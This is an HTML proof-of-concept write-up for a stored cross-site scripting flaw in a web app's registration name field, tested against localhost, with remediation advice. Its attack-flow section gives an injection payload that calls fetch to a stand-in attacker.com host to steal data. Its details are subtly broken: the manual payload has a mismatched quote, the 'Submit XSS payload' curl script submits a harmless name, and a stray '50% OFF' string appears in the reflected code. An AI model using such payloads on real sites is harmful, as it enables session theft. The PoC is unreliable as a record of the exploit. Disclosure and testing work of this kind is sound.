<!DOCTYPE html>
<html>
<head>
    <title>Stored XSS in Registration Name Field - POC</title>
</head>
<body>
    <h1>Stored XSS Vulnerability POC</h1>
    <h2>Target: http://localhost/accounts/register/</h2>
    
    <h3>Vulnerability Details:</h3>
    <p>The registration workflow stores user input from the "name" field in the session without sanitization. 
    When a user reaches step 3 of registration, the name is reflected directly into a JavaScript alert() function,
    allowing arbitrary JavaScript execution.</p>
    
    <h3>Attack Flow:</h3>
    <ol>
        <li>Attacker submits registration with name: <code>test"); fetch("http://attacker.com/steal"); alert("</code></li>
        <li>The application stores this in the session without sanitization</li>
        <li>On step 3, the JavaScript becomes: <code>alert("Hello test"); fetch("http://attacker.com/steal"); alert(". Just Now up to 50% OFF ")</code></li>
        <li>The injected JavaScript is executed in the user's browser</li>
    </ol>
    
    <h3>Proof of Concept - Manual Steps:</h3>
    <pre>
# Step 1: Visit http://localhost/accounts/register/step1/
# Step 2: Enter name with payload: test"); alert("XSS'
# Step 3: Enter password: testpassword123
# Step 4: Click Submit
# Step 5: On step2, enter email: test@example.com
# Step 6: Click Submit
# Step 7: View step 3 - The alert will contain: "Hello test"); alert("XSS'"
    </pre>
    
    <h3>Automated Test (using curl):</h3>
    <pre>
#!/bin/bash
# Get CSRF token
RESPONSE=$(curl -s http://localhost/accounts/register/step1/ -c cookies.txt -b cookies.txt)
CSRF=$(echo "$RESPONSE" | grep -oP 'csrfmiddlewaretoken.*?value="\K[^"]+')

# Submit XSS payload
curl -X POST http://localhost/accounts/register/step1/ \
  -b cookies.txt \
  -c cookies.txt \
  -d 'csrfmiddlewaretoken='$CSRF'&name=xsstest&password=testpassword123'

# Navigate to step 2 and submit
RESPONSE=$(curl -s http://localhost/accounts/register/step2/ -b cookies.txt)
CSRF=$(echo "$RESPONSE" | grep -oP 'csrfmiddlewaretoken.*?value="\K[^"]+')
curl -X POST http://localhost/accounts/register/step2/ \
  -b cookies.txt \
  -c cookies.txt \
  -d 'csrfmiddlewaretoken='$CSRF'&email=test@example.com'

# View step 3 - JavaScript is executed
curl -s http://localhost/accounts/register/step3/ -b cookies.txt | grep 'alert.*Hello'
    </pre>
    
    <h3>Impact:</h3>
    <ul>
        <li>Session token theft</li>
        <li>Credential harvesting</li>
        <li>CSRF attacks</li>
        <li>Malware distribution</li>
        <li>Redirection to phishing sites</li>
    </ul>
    
    <h3>Remediation:</h3>
    <ul>
        <li>Use proper output encoding for JavaScript context</li>
        <li>Never concatenate user input directly into script tags</li>
        <li>Use a templating engine with auto-escaping</li>
        <li>Implement Content Security Policy (CSP) headers</li>
        <li>Validate and sanitize user input</li>
    </ul>
</body>
</html>
